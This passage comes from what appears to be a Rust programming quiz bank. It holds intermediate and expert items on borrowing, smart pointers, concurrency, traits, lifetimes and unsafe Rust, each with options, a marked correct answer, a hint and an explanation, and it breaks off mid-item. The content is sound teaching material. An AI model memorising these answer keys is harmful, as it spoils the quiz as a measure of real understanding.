    correctAnswer: "Cannot borrow `s` as mutable because it is also borrowed as immutable (`r1`) in the same scope",
    acceptedAnswers: ["Cannot borrow `s` as mutable because it is also borrowed as immutable (`r1`) in the same scope"],
    hint: "Rust core aliasing rule: You may have any number of immutable references (`&T`) OR exactly one mutable reference (`&mut T`), but NEVER both at the same time.",
    explanation: "To prevent data races at compile time, Rust enforces the aliasing XOR mutability rule: at any given time, you can have either one mutable reference or any number of immutable references, but not both concurrently.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["borrow_checker", "aliasing", "mutability"]
  },
  {
    id: "rust-int-002",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "borrowing",
    subtopic: "nll_scope",
    standardVersion: "Rust 2021",
    prompt: "Why is this code valid under Non-Lexical Lifetimes (NLL) in Rust 2018/2021?",
    code: "fn main() {\n    let mut s = String::from(\"hello\");\n    let r1 = &s;\n    println!(\"{}\", r1); // Last use of r1\n    let r2 = &mut s;\n    r2.push_str(\" world\");\n    println!(\"{}\", r2);\n}",
    options: [
      "NLL ends r1's lifetime after its last use (the first println), allowing `&mut s` to be created safely",
      "Rust disables the borrow checker when println! executes",
      "r1 is converted into r2 automatically",
      "s is cloned implicitly on line 5"
    ],
    correctAnswer: "NLL ends r1's lifetime after its last use (the first println), allowing `&mut s` to be created safely",
    acceptedAnswers: ["NLL ends r1's lifetime after its last use (the first println), allowing `&mut s` to be created safely"],
    hint: "Before NLL, references lived until the end of their enclosing curly-brace scope. NLL tracks the actual last line where the reference is used.",
    explanation: "Under Non-Lexical Lifetimes (NLL), reference lifetimes end at their point of last use rather than the end of their lexical block. Because `r1` is never read after line 4, its borrow ends, permitting the mutable borrow `r2` on line 5.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["nll", "lifetimes", "borrowing"]
  },
  {
    id: "rust-int-003",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "smart_pointers",
    subtopic: "box_recursive",
    standardVersion: "Rust 2021",
    prompt: "Why must recursive types like linked list nodes be wrapped in `Box<T>` in Rust?",
    code: "enum List {\n    Cons(i32, Box<List>),\n    Nil,\n}",
    options: [
      "`Box<T>` has a known, fixed pointer size (usize), enabling the compiler to calculate the enum's memory layout",
      "`Box<T>` prevents stack unwinding during panics",
      "`Box<T>` automatically converts the list into a vector",
      "Direct recursion is only permitted in unsafe blocks"
    ],
    correctAnswer: "`Box<T>` has a known, fixed pointer size (usize), enabling the compiler to calculate the enum's memory layout",
    acceptedAnswers: ["`Box<T>` has a known, fixed pointer size (usize), enabling the compiler to calculate the enum's memory layout"],
    hint: "Without `Box`, a type containing itself would require infinite size on the stack.",
    explanation: "Rust must know at compile time how much memory to allocate for a value of a type. A directly recursive enum `Cons(i32, List)` has infinite theoretical size. `Box<T>` is a heap pointer with a fixed size (one pointer/usize), giving `List` a definite size.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["box", "smart_pointers", "recursion"]
  },
  {
    id: "rust-int-004",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "smart_pointers",
    subtopic: "rc_reference_counting",
    standardVersion: "Rust 2021",
    prompt: "What is printed by tracking the strong count of an `Rc` smart pointer?",
    code: "use std::rc::Rc;\nfn main() {\n    let a = Rc::new(5);\n    let b = Rc::clone(&a);\n    let c = Rc::clone(&a);\n    println!(\"{}\", Rc::strong_count(&a));\n}",
    options: ["3", "1", "2", "Compilation error: Rc::clone requires mut"],
    correctAnswer: "3",
    acceptedAnswers: ["3"],
    hint: "`Rc::clone(&a)` increments the reference counter without deep-copying the underlying data.",
    explanation: "`Rc<T>` enables multiple ownership for single-threaded scenarios. Creating `a` sets the reference count to 1. Each `Rc::clone` increments the reference counter. With `a`, `b`, and `c`, `Rc::strong_count(&a)` returns 3.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["rc", "reference_counting", "smart_pointers"]
  },
  {
    id: "rust-int-005",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "smart_pointers",
    subtopic: "refcell_runtime_borrow",
    standardVersion: "Rust 2021",
    prompt: "What happens when `RefCell<T>` violates borrowing rules at runtime?",
    code: "use std::cell::RefCell;\nfn main() {\n    let c = RefCell::new(5);\n    let r1 = c.borrow();\n    let mut r2 = c.borrow_mut(); // Second borrow while r1 active!\n    println!(\"{} {}\", *r1, *r2);\n}",
    options: [
      "Thread panics at runtime with: AlreadyBorrowed",
      "Compilation error at line 5",
      "Prints '5 5'",
      "Undefined behavior and memory corruption"
    ],
    correctAnswer: "Thread panics at runtime with: AlreadyBorrowed",
    acceptedAnswers: ["Thread panics at runtime with: AlreadyBorrowed"],
    hint: "`RefCell` moves borrow checking from compile time to runtime using dynamic panic checks.",
    explanation: "`RefCell<T>` provides interior mutability by checking borrowing rules dynamically at runtime. When `c.borrow_mut()` is called while an immutable borrow `r1` is still in scope, `RefCell` panics with `'already borrowed: BorrowMutError'` instead of failing compilation.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["refcell", "interior_mutability", "runtime_borrow"]
  },
  {
    id: "rust-int-006",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "concurrency",
    subtopic: "arc_mutex",
    standardVersion: "Rust 2021",
    prompt: "Why must `Arc<Mutex<T>>` be used instead of `Rc<RefCell<T>>` when sharing state across multiple threads?",
    code: "use std::sync::{Arc, Mutex};\nuse std::thread;",
    options: [
      "`Arc` uses thread-safe atomic reference counting and `Mutex` implements `Sync`, whereas `Rc` and `RefCell` are not thread-safe",
      "`Rc` is deprecated in Rust 2021",
      "`Arc` allocates memory in the kernel space",
      "`Mutex` prevents threads from using CPU cycles"
    ],
    correctAnswer: "`Arc` uses thread-safe atomic reference counting and `Mutex` implements `Sync`, whereas `Rc` and `RefCell` are not thread-safe",
    acceptedAnswers: ["`Arc` uses thread-safe atomic reference counting and `Mutex` implements `Sync`, whereas `Rc` and `RefCell` are not thread-safe"],
    hint: "`Rc` does not use atomic operations for incrementing counts, which causes data races across threads.",
    explanation: "`Rc<T>` uses non-atomic arithmetic for speed and does not implement `Send`, making it impossible to pass across threads. `Arc<T>` uses atomic operations (thread-safe), and `Mutex<T>` ensures mutual exclusion and implements `Send` + `Sync`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["concurrency", "arc", "mutex", "threads"]
  },
  {
    id: "rust-int-007",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "concurrency",
    subtopic: "mpsc_channel",
    standardVersion: "Rust 2021",
    prompt: "What is printed by this thread channel communication?",
    code: "use std::sync::mpsc;\nuse std::thread;\nfn main() {\n    let (tx, rx) = mpsc::channel();\n    thread::spawn(move || {\n        tx.send(\"ping\").unwrap();\n    });\n    let msg = rx.recv().unwrap();\n    println!(\"{}\", msg);\n}",
    options: ["ping", "()", "Compilation error: tx cannot cross thread boundary", "None"],
    correctAnswer: "ping",
    acceptedAnswers: ["ping"],
    hint: "`mpsc::channel()` provides Multiple Producer, Single Consumer FIFO message passing.",
    explanation: "`mpsc` stands for Multi-Producer, Single-Consumer. The spawned thread moves `tx` and sends `'ping'`. The main thread calls blocking `rx.recv().unwrap()`, successfully receiving and printing `'ping'`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["concurrency", "channels", "mpsc"]
  },
  {
    id: "rust-int-008",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "traits",
    subtopic: "trait_implementation",
    standardVersion: "Rust 2021",
    prompt: "What is printed by this trait method invocation?",
    code: "trait Speak {\n    fn say(&self) -> &str;\n}\nstruct Dog;\nimpl Speak for Dog {\n    fn say(&self) -> &str { \"woof\" }\n}\nfn talk<T: Speak>(item: T) {\n    println!(\"{}\", item.say());\n}\nfn main() {\n    talk(Dog);\n}",
    options: ["woof", "Dog", "Speak", "Compilation error"],
    correctAnswer: "woof",
    acceptedAnswers: ["woof"],
    hint: "`talk` uses a trait bound `<T: Speak>` ensuring the passed argument implements `Speak`.",
    explanation: "`Dog` implements the `Speak` trait. The generic function `talk<T: Speak>` accepts `Dog` and invokes `.say()`, which returns and prints `'woof'` via static dispatch.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["traits", "generics", "polymorphism"]
  },
  {
    id: "rust-int-009",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "iterators",
    subtopic: "lazy_iterators",
    standardVersion: "Rust 2021",
    prompt: "What happens when executing an iterator adapter sequence without calling a consumer like `.collect()`?",
    code: "fn main() {\n    let v = vec![1, 2, 3];\n    v.iter().map(|x| { println!(\"VAL: {}\", x); x * 2 });\n    println!(\"DONE\");\n}",
    options: [
      "Prints only 'DONE' (iterators are lazy and do nothing unless consumed)",
      "Prints VAL: 1, VAL: 2, VAL: 3, then DONE",
      "Compilation error: unused iterator must be consumed",
      "Runtime panic"
    ],
    correctAnswer: "Prints only 'DONE' (iterators are lazy and do nothing unless consumed)",
    acceptedAnswers: ["Prints only 'DONE' (iterators are lazy and do nothing unless consumed)"],
    hint: "In Rust, iterators are lazy: calling `.map()` simply builds a struct; no items are processed until `.next()` or `.collect()` is called.",
    explanation: "Rust iterators are strictly lazy. Adapters like `.map()` do not perform any computation on their own. Because no consuming method (such as `.collect()`, `for` loop, or `.count()`) was called, the closure never runs, and only `'DONE'` is printed.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["iterators", "lazy_evaluation", "functional"]
  },
  {
    id: "rust-int-010",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "closures",
    subtopic: "move_closures",
    standardVersion: "Rust 2021",
    prompt: "What does the `move` keyword before a closure definition force?",
    code: "fn main() {\n    let s = String::from(\"hello\");\n    let consume = move || println!(\"{}\", s);\n    consume();\n}",
    options: [
      "Forces the closure to take ownership of captured variables rather than borrowing them",
      "Forces the closure to execute in a separate operating system thread",
      "Converts the closure into a function pointer (fn)",
      "Makes captured variables mutable"
    ],
    correctAnswer: "Forces the closure to take ownership of captured variables rather than borrowing them",
    acceptedAnswers: ["Forces the closure to take ownership of captured variables rather than borrowing them"],
    hint: "`move` transfers ownership of `s` into the closure, commonly required when moving closures across thread boundaries.",
    explanation: "By default, closures capture variables by reference if possible. Adding `move` forces the closure to take full ownership of any captured variables from the surrounding environment.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["closures", "move", "ownership"]
  },
  {
    id: "rust-int-011",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "lifetimes",
    subtopic: "function_lifetime_annotations",
    standardVersion: "Rust 2021",
    prompt: "Why are lifetime annotations required on this function returning the longest of two string references?",
    code: "fn longest<'a>(x: &'a str, y: &'a str) -> &'a str {\n    if x.len() > y.len() { x } else { y }\n}",
    options: [
      "The compiler cannot know at compile time whether x or y will be returned, so `'a` ensures the returned reference is valid for the smaller of the two inputs' lifetimes",
      "Lifetimes allocate memory on the stack for the return value",
      "Without lifetimes, the compiler converts references to raw pointers",
      "It prevents string slices from being mutated"
    ],
    correctAnswer: "The compiler cannot know at compile time whether x or y will be returned, so `'a` ensures the returned reference is valid for the smaller of the two inputs' lifetimes",
    acceptedAnswers: ["The compiler cannot know at compile time whether x or y will be returned, so `'a` ensures the returned reference is valid for the smaller of the two inputs' lifetimes"],
    hint: "Lifetime annotations do not change how long variables live; they describe the relationship between input and output reference lifetimes to prevent dangling references.",
    explanation: "Because `longest` returns either `x` or `y` based on runtime lengths, the borrow checker cannot infer which reference is returned. The generic lifetime `'a` tells the compiler that the returned reference is valid as long as BOTH `x` and `y` are valid.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["lifetimes", "borrow_checker", "references"]
  },
  {
    id: "rust-int-012",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "drop",
    subtopic: "raii_cleanup",
    standardVersion: "Rust 2021",
    prompt: "What is printed when values implementing the `Drop` trait go out of scope?",
    code: "struct CustomDrop(&'static str);\nimpl Drop for CustomDrop {\n    fn drop(&mut self) {\n        print!(\"{} \", self.0);\n    }\n}\nfn main() {\n    let _a = CustomDrop(\"A\");\n    let _b = CustomDrop(\"B\");\n}",
    options: ["B A ", "A B ", "A ", "Compilation error: drop cannot be derived"],
    correctAnswer: "B A ",
    acceptedAnswers: ["B A "],
    hint: "Variables are dropped in the exact reverse order of their declaration (LIFO stack unwinding).",
    explanation: "Rust drops local variables in reverse order of declaration (LIFO). Since `_a` was created first and `_b` second, `_b` is dropped first (printing 'B '), followed by `_a` (printing 'A '). Output is `B A `.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["drop", "raii", "memory"]
  },
  {
    id: "rust-int-013",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "dispatch",
    subtopic: "static_vs_dynamic",
    standardVersion: "Rust 2021",
    prompt: "What is the difference between `impl Trait` and `dyn Trait` in Rust function arguments?",
    code: "fn static_disp(x: impl Trait) {}\nfn dynamic_disp(x: &dyn Trait) {}",
    options: [
      "`impl Trait` uses static dispatch (monomorphization at compile time); `dyn Trait` uses dynamic dispatch (vtable pointer lookup at runtime)",
      "`impl Trait` uses heap allocation; `dyn Trait` uses stack allocation",
      "`impl Trait` is only available in unsafe blocks",
      "`dyn Trait` compiles faster and produces smaller binary size"
    ],
    correctAnswer: "`impl Trait` uses static dispatch (monomorphization at compile time); `dyn Trait` uses dynamic dispatch (vtable pointer lookup at runtime)",
    acceptedAnswers: ["`impl Trait` uses static dispatch (monomorphization at compile time); `dyn Trait` uses dynamic dispatch (vtable pointer lookup at runtime)"],
    hint: "`impl Trait` generates separate compiled functions for each concrete type. `dyn Trait` uses fat pointers with vtables.",
    explanation: "`impl Trait` generates specialized copies of code for each concrete type at compile time with zero runtime overhead (monomorphization). `dyn Trait` represents a trait object using a fat pointer (data pointer + vtable pointer) resolving methods at runtime.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["dispatch", "traits", "monomorphization"]
  },
  {
    id: "rust-int-014",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "newtype",
    subtopic: "type_safety",
    standardVersion: "Rust 2021",
    prompt: "What is the primary architectural benefit of the Newtype Pattern in Rust?",
    code: "struct Inches(u64);\nstruct Millimeters(u64);\nfn calculate(length: Inches) {}",
    options: [
      "Zero-cost compile-time type safety preventing accidental mixing of units with different semantics",
      "Increases runtime execution speed through CPU SIMD instructions",
      "Allows the struct to be serialized over network sockets automatically",
      "Grants garbage collection to primitive types"
    ],
    correctAnswer: "Zero-cost compile-time type safety preventing accidental mixing of units with different semantics",
    acceptedAnswers: ["Zero-cost compile-time type safety preventing accidental mixing of units with different semantics"],
    hint: "Wrapping a primitive in a 1-tuple struct has no runtime overhead, but ensures you cannot pass `Millimeters` where `Inches` is required.",
    explanation: "The Newtype Pattern wraps existing types in single-field tuple structs. The compiler ensures at compile time that an `Inches` value cannot be passed into a function expecting `Millimeters`, with zero runtime memory or execution overhead.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["newtype", "type_safety", "zero_cost"]
  },
  {
    id: "rust-int-015",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "option",
    subtopic: "and_then_combinator",
    standardVersion: "Rust 2021",
    prompt: "What is printed by chaining Option combinators `.map()` and `.and_then()`?",
    code: "fn sq(x: u32) -> Option<u32> { Some(x * x) }\nfn main() {\n    let res = Some(2).and_then(sq).map(|n| n + 1);\n    println!(\"{:?}\", res);\n}",
    options: ["Some(5)", "Some(4)", "None", "5"],
    correctAnswer: "Some(5)",
    acceptedAnswers: ["Some(5)"],
    hint: "`Some(2).and_then(sq)` yields `Some(4)`. Then `.map(|n| n + 1)` yields `Some(5)`.",
    explanation: "`.and_then()` flattens operations returning `Option`: `2` passed into `sq` yields `Some(4)`. Next, `.map(|n| n + 1)` maps the inner value from 4 to 5, resulting in `Some(5)`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["option", "combinators", "functional"]
  },
  {
    id: "rust-int-016",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "closures",
    subtopic: "fn_traits",
    standardVersion: "Rust 2021",
    prompt: "Which closure trait hierarchy represents closures that can be called repeatedly and mutate their captured environment?",
    code: "// Closure Trait Hierarchy: FnOnce -> FnMut -> Fn",
    options: ["FnMut", "FnOnce", "Fn", "FnBox"],
    correctAnswer: "FnMut",
    acceptedAnswers: ["FnMut"],
    hint: "`FnOnce` consumes captured variables, `FnMut` mutates them, and `Fn` borrows them immutably.",
    explanation: "`FnOnce` can only be called once because it consumes captured values. `FnMut` can be called multiple times and mutates captured state (`&mut self`). `Fn` can be called repeatedly without mutating captured state (`&self`).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["closures", "fn_traits"]
  },
  {
    id: "rust-int-017",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "generics",
    subtopic: "where_clause",
    standardVersion: "Rust 2021",
    prompt: "What is the primary stylistic and practical advantage of using a `where` clause in generic functions?",
    code: "fn complex<T, U>(t: T, u: U) -> i32\nwhere\n    T: std::fmt::Display + Clone,\n    U: std::fmt::Debug + Copy,\n{\n    0\n}",
    options: [
      "Provides cleaner readability and supports advanced trait bounds like higher-ranked trait bounds that inline syntax cannot express",
      "Compiles into dynamic vtables instead of static dispatch",
      "Allows generic types to be dynamically typed at runtime",
      "Disables borrow checker inspection on generic arguments"
    ],
    correctAnswer: "Provides cleaner readability and supports advanced trait bounds like higher-ranked trait bounds that inline syntax cannot express",
    acceptedAnswers: ["Provides cleaner readability and supports advanced trait bounds like higher-ranked trait bounds that inline syntax cannot express"],
    hint: "When functions have multiple generic parameters with multiple bounds, inline `<T: A + B, U: C + D>` becomes cluttered.",
    explanation: "`where` clauses clarify signatures with multiple generic parameters and multiple trait bounds. In addition, certain advanced constraints (such as associated types or Higher-Ranked Trait Bounds `where for<'a>`) can only be expressed with `where` clauses.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["generics", "where_clause", "traits"]
  },
  {
    id: "rust-int-018",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "lifetimes",
    subtopic: "struct_lifetimes",
    standardVersion: "Rust 2021",
    prompt: "What does the lifetime `'a` in `struct Excerpt<'a> { part: &'a str }` declare?",
    code: "struct Excerpt<'a> {\n    part: &'a str,\n}",
    options: [
      "An instance of Excerpt cannot outlive the string slice referenced by `part`",
      "The string is allocated on the heap for the duration of the entire program",
      "The struct can only be used inside asynchronous functions",
      "The struct is automatically deallocated after 60 seconds"
    ],
    correctAnswer: "An instance of Excerpt cannot outlive the string slice referenced by `part`",
    acceptedAnswers: ["An instance of Excerpt cannot outlive the string slice referenced by `part`"],
    hint: "Any struct holding references must be parameterized with a lifetime ensuring the referenced data outlives the struct instance.",
    explanation: "When a struct stores a reference, it must declare a lifetime parameter. `'a` specifies that an instance of `Excerpt` cannot exist longer than the underlying reference in `part`, preventing dangling pointers.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["lifetimes", "structs", "borrow_checker"]
  },
  {
    id: "rust-int-019",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "collections",
    subtopic: "entry_api",
    standardVersion: "Rust 2021",
    prompt: "What does the `HashMap` Entry API `.or_insert()` return?",
    code: "use std::collections::HashMap;\nfn main() {\n    let mut map = HashMap::new();\n    let val = map.entry(\"apples\").or_insert(0);\n    *val += 5;\n    println!(\"{}\", map[\"apples\"]);\n}",
    options: ["5", "0", "None", "Compilation error: cannot mutate map during entry"],
    correctAnswer: "5",
    acceptedAnswers: ["5"],
    hint: "`or_insert()` returns a mutable reference `&mut V` to the value for the key.",
    explanation: "The `entry()` API checks if a key exists. `.or_insert(0)` inserts `0` if absent and returns a mutable reference `&mut V` to the entry. Dereferencing `*val += 5` modifies the value directly in the map, so `map[\"apples\"]` is 5.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["hashmap", "entry_api", "collections"]
  },
  {
    id: "rust-int-020",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "ownership",
    subtopic: "dangling_pointer_prevention",
    standardVersion: "Rust 2021",
    prompt: "Why does the Rust compiler reject this function returning a reference to a local variable?",
    code: "fn dangle() -> &String {\n    let s = String::from(\"hello\");\n    &s\n}",
    options: [
      "Compilation error: returns a value referencing data owned by the current function (s is dropped on return)",
      "Strings can only be returned by value, never by reference",
      "dangle function must be marked unsafe",
      "Runtime panic on return"
    ],
    correctAnswer: "Compilation error: returns a value referencing data owned by the current function (s is dropped on return)",
    acceptedAnswers: ["Compilation error: returns a value referencing data owned by the current function (s is dropped on return)"],
    hint: "`s` is allocated locally in `dangle` and deallocated when the function ends. Returning `&s` would create a dangling pointer.",
    explanation: "`s` is created inside `dangle`. When `dangle` returns, `s` goes out of scope and is dropped. Returning `&s` would return a reference to freed memory. The compiler detects this and rejects it with `error[E0106]: missing lifetime specifier`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["borrow_checker", "dangling_pointers", "lifetimes"]
  },

  // =========================================================================
  // RUST EXPERT (20 QUESTIONS: rust-exp-001 to rust-exp-020)
  // =========================================================================
  {
    id: "rust-exp-001",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "unsafe_rust",
    subtopic: "unsafe_superpowers",
    standardVersion: "Rust 2021",
    prompt: "Which of the following operations is allowed ONLY inside an `unsafe` block in Rust?",
    code: "unsafe {\n    // Which operation strictly requires this block?\n}",
    options: [
      "Dereferencing a raw pointer (`*const T` or `*mut T`)",
      "Allocating memory on the heap using Box::new",
      "Calling a method that returns a Result or Option",
      "Spawning an operating system thread"
    ],
    correctAnswer: "Dereferencing a raw pointer (`*const T` or `*mut T`)",
    acceptedAnswers: ["Dereferencing a raw pointer (`*const T` or `*mut T`)"],
    hint: "Creating raw pointers is safe, but dereferencing them is unsafe because the compiler cannot guarantee memory validity.",
    explanation: "Rust defines 5 specific 'unsafe superpowers': 1) Dereferencing raw pointers, 2) Calling unsafe functions/methods, 3) Implementing unsafe traits, 4) Mutating mutable static variables, and 5) Accessing fields of a union. Heap allocation and thread spawning are completely safe.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["unsafe", "raw_pointers", "rust"]
  },
  {
    id: "rust-exp-002",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency_traits",
    subtopic: "send_and_sync",
    standardVersion: "Rust 2021",
    prompt: "What is the technical distinction between the `Send` and `Sync` auto-traits in Rust?",
    code: "// Auto Traits\npub unsafe auto trait Send {}\npub unsafe auto trait Sync {}",
    options: [
      "`Send` indicates ownership can be transferred across thread boundaries; `Sync` indicates references (`&T`) can be shared safely across threads",
      "`Send` is for async/await; `Sync` is for synchronous blocking threads",
      "`Send` is only implemented by primitive types; `Sync` is implemented by structs",
      "`Send` uses network sockets; `Sync` uses shared memory"
    ],
    correctAnswer: "`Send` indicates ownership can be transferred across thread boundaries; `Sync` indicates references (`&T`) can be shared safely across threads",
    acceptedAnswers: ["`Send` indicates ownership can be transferred across thread boundaries; `Sync` indicates references (`&T`) can be shared safely across threads"],
    hint: "`T` is `Sync` if and only if `&T` is `Send`.",
    explanation: "A type is `Send` if ownership of its value can be safely moved to another thread. A type is `Sync` if it is safe to share references to it among multiple threads concurrently (`T: Sync` if and only if `&T: Send`). `Rc<T>` is neither `Send` nor `Sync`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["send", "sync", "concurrency", "traits"]
  },
  {
    id: "rust-exp-003",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "async_rust",
    subtopic: "pinning_unpin",
    standardVersion: "Rust 2021",
    prompt: "Why is `Pin<&mut T>` required when polling self-referential futures in asynchronous Rust?",
    code: "use std::pin::Pin;\nuse std::task::{Context, Poll};\nfn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output>;",
    options: [
      "To guarantee that the memory location of the struct will never move, preventing internal self-referential pointers from becoming invalid",
      "To force the future to execute on CPU core 0",
      "To prevent the future from being polled concurrently by multiple threads",
      "To allocate the future on the GPU heap"
    ],
    correctAnswer: "To guarantee that the memory location of the struct will never move, preventing internal self-referential pointers from becoming invalid",
    acceptedAnswers: ["To guarantee that the memory location of the struct will never move, preventing internal self-referential pointers from becoming invalid"],
    hint: "Async functions compile into state machines where local variables can hold references to other local variables across `await` points.",
    explanation: "When an async block awaits, compiler-generated state machines often hold internal references to their own fields. If the struct moves in memory, those internal pointers become dangling. `Pin` wraps pointers to guarantee the underlying data will not be moved before being dropped.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["pin", "async", "futures", "memory"]
  },
  {
    id: "rust-exp-004",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "types",
    subtopic: "phantom_data",
    standardVersion: "Rust 2021",
    prompt: "What purpose does `PhantomData<T>` serve in generic Rust structs?",
    code: "use std::marker::PhantomData;\nstruct Slice<'a, T> {\n    ptr: *const T,\n    _marker: PhantomData<&'a T>,\n}",
    options: [
      "It informs the compiler's type checker and borrow checker that the struct logically acts as if it owns or references `T` and lifetime `'a`, without storing actual data",
      "It dynamically allocates zeroed memory for unused fields",
      "It allows a struct to be cast to any type without unsafe",
      "It marks the struct as deprecated in the documentation"
    ],
    correctAnswer: "It informs the compiler's type checker and borrow checker that the struct logically acts as if it owns or references `T` and lifetime `'a`, without storing actual data",
    acceptedAnswers: ["It informs the compiler's type checker and borrow checker that the struct logically acts as if it owns or references `T` and lifetime `'a`, without storing actual data"],
    hint: "`PhantomData` is a zero-sized type used purely for compile-time variance and lifetime tracking.",
    explanation: "If a struct has a generic type or lifetime parameter that isn't used in any field, the compiler rejects it (unused parameter). `PhantomData<T>` is a zero-sized type telling the compiler to treat the struct as if it contains `T` for variance, drop check, and lifetime analysis.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["phantom_data", "variance", "generics"]
  },
  {
    id: "rust-exp-005",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "traits",
    subtopic: "object_safety",
    standardVersion: "Rust 2021",
    prompt: "Which rule prevents a trait from being used as a Trait Object (`dyn Trait`) in Rust?",
    code: "// Why is this trait NOT object-safe?\ntrait BadTrait {\n    fn clone_me(&self) -> Self;\n}",
    options: [
      "The method returns `Self`, which has an unknown dynamic size at compile time when dispatched through a vtable",
      "The trait has fewer than 2 methods",
      "The trait name contains uppercase letters",
      "Trait objects cannot be used with structs"
    ],
    correctAnswer: "The method returns `Self`, which has an unknown dynamic size at compile time when dispatched through a vtable",
    acceptedAnswers: ["The method returns `Self`, which has an unknown dynamic size at compile time when dispatched through a vtable"],
    hint: "Object safety requires: 1) all associated methods require `Self: Sized` or have a receiver that references `Self`, and 2) methods cannot return `Self` or have generic type parameters.",
    explanation: "For a trait to be object-safe (used as `dyn Trait`), the compiler must build a vtable. Methods returning `Self` cannot be in a vtable because the caller does not know the concrete type or size of `Self` behind the trait object pointer.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["object_safety", "traits", "dyn_trait"]
  },
  {
    id: "rust-exp-006",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "traits",
    subtopic: "orphan_rule",
    standardVersion: "Rust 2021",
    prompt: "What does the Orphan Rule (Coherence) mandate regarding trait implementations in Rust?",
    code: "// Attempting to implement an external trait for an external type\nimpl std::fmt::Display for Vec<i32> { ... } // REJECTED!",
    options: [
      "You can only implement a trait for a type if either the trait or the type was defined in your current crate",
      "Traits cannot be implemented for structs with private fields",
      "Only the standard library can implement Display",
      "Trait implementations must be written in the same file as main()"
    ],
    correctAnswer: "You can only implement a trait for a type if either the trait or the type was defined in your current crate",
    acceptedAnswers: ["You can only implement a trait for a type if either the trait or the type was defined in your current crate"],
    hint: "This prevents two different crates from defining conflicting implementations for the same trait on the same type.",
    explanation: "The orphan rule enforces coherence: there can never be two ambiguous implementations of a trait for a type. You can write `impl Trait for Type` only if `Trait` is local to your crate OR `Type` is local to your crate. If both are external, the compiler rejects it.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["orphan_rule", "coherence", "traits"]
  },
  {
    id: "rust-exp-007",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_layout",
    subtopic: "repr_c",
    standardVersion: "Rust 2021",
    prompt: "What is the purpose of the `#[repr(C)]` attribute on a Rust struct?",
    code: "#[repr(C)]\nstruct PacketHeader {\n    magic: u32,\n    version: u8,\n    checksum: u16,\n}",
    options: [
      "Forces the compiler to lay out struct fields in memory matching the C ABI specification, ensuring compatibility with C FFI and hardware protocols",
      "Converts the struct into a C++ class with virtual functions",
      "Compiles the struct using GCC instead of LLVM",
      "Automatically generates C header files in /usr/include"
    ],
    correctAnswer: "Forces the compiler to lay out struct fields in memory matching the C ABI specification, ensuring compatibility with C FFI and hardware protocols",
    acceptedAnswers: ["Forces the compiler to lay out struct fields in memory matching the C ABI specification, ensuring compatibility with C FFI and hardware protocols"],
    hint: "By default, Rust's `repr(Rust)` does not guarantee field ordering or padding. `repr(C)` guarantees standard C memory alignment.",
    explanation: "Under the default `repr(Rust)`, the compiler is free to reorder fields to minimize padding and struct size. `#[repr(C)]` forces the struct layout to strictly follow C ABI field ordering and alignment rules, necessary for FFI and binary packet parsing.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["ffi", "repr_c", "memory_layout"]
  },
  {
    id: "rust-exp-008",
    language: "rust",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_management",
    subtopic: "circular_references_leak",
    standardVersion: "Rust 2021",
    prompt: "How can safe Rust code accidentally create a memory leak without triggering compile errors or undefined behavior?",
    code: "use std::rc::Rc;\nuse std::cell::RefCell;\n// Node holding Rc<RefCell<Node>> to each other",
    options: [
      "By creating reference cycles using `Rc` and `RefCell`, preventing strong reference counts from ever reaching zero",
      "By leaving local variables in an infinite loop",
